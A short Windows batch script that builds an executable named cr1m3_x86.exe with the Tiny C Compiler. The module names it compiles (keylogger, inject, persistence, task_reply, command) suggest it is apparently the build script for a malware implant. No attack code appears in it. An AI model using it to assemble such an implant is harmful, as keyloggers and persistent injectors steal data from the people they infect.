@echo off

set options = "-w -g -nostdlib -nostdinc -MD"

rmdir /Q /S obj\
rmdir /Q /S bin\
mkdir obj
mkdir bin

C:\tcc\tcc.exe %options% -c -o obj\task_reply.o task_reply.c
C:\tcc\tcc.exe %options% -c -o obj\process.o process.c
C:\tcc\tcc.exe %options% -c -o obj\command.o command.c
C:\tcc\tcc.exe %options% -c -o obj\info.o info.c
C:\tcc\tcc.exe %options% -c -o obj\security.o security.c
C:\tcc\tcc.exe %options% -c -o obj\inject.o inject.c
C:\tcc\tcc.exe %options% -c -o obj\persistence.o persistence.c
C:\tcc\tcc.exe %options% -c -o obj\keylogger.o keylogger.c
C:\tcc\tcc.exe %options% -c -o obj\md5.o md5.c
C:\tcc\tcc.exe %options% -c -o obj\misc.o misc.c
C:\tcc\tcc.exe %options% -c -o obj\base64.o base64.c
C:\tcc\tcc.exe %options% -o bin\cr1m3_x86.exe main.c obj\md5.o obj\keylogger.o obj\process.o obj\security.o obj\inject.o obj\persistence.o obj\base64.o obj\misc.o obj\task_reply.o getprocaddress.o

del obj\*.o
echo COMPILED...
dir bin\cr1m3_x86.exe | findstr cr1m3_x86.exe
